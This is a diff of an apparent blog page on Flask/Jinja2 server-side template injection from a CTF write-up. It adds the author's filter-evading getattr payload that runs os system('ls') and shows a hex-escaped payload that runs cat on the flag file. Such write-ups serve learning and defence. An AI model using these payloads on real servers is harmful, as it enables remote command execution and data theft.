@@ -51,7 +51,7 @@
 <meta property="og:image" content="https://i.loli.net/2020/02/24/jw7sStYhX534kTa.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/24/VhvMFANZCy7m9fz.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/24/WAyTklhRX4iYeOa.png">
-<meta property="og:updated_time" content="2020-02-26T15:24:39.091Z">
+<meta property="og:updated_time" content="2020-02-27T08:01:06.704Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="flask模版注入">
 <meta name="twitter:image" content="https://i.loli.net/2020/02/24/NB1qgLYkTtIsiWo.png">
@@ -348,7 +348,11 @@
 
 <p>======================分割线</p>
 <p><strong>安恒杯抗疫月赛</strong></p>
-<p>没打比赛，似乎是过滤了<code>.</code>和<code>_</code>，看到下面两个payload</p>
+<p>没打比赛，似乎是过滤了<code>.</code>和<code>_</code>，</p>
+<p>我想到的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(getattr(getattr(getattr(getattr(&apos;&apos;,dir(0)[0][0]*2+&apos;class&apos;+dir(0)[0][0]*2),dir(0)[0][0]*2+&apos;mro&apos;+dir(0)[0][0]*2)[-1],dir(0)[0][0]*2+&apos;subclasses&apos;+dir(0)[0][0]*2)()[127],dir(0)[0][0]*2+&apos;init&apos;+dir(0)[0][0]*2),dir(0)[0][0]*2+&apos;globals&apos;+dir(0)[0][0]*2)[&apos;system&apos;](&apos;ls&apos;)</span><br></pre></td></tr></table></figure>
+
+<p>赛后看到下面两个payload</p>
 <p>payload1，利用16进制编码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fmro\x5f\x5f&quot;][1][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[30][&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;\x5f\x5fbuiltins\x5f\x5f&quot;][&apos;\x5f\x5fimport\x5f\x5f&apos;](&apos;os&apos;)[&quot;popen&quot;](&apos;cat%20/flag*&apos;)[&apos;read&apos;]()&#125;&#125;</span><br></pre></td></tr></table></figure>
 
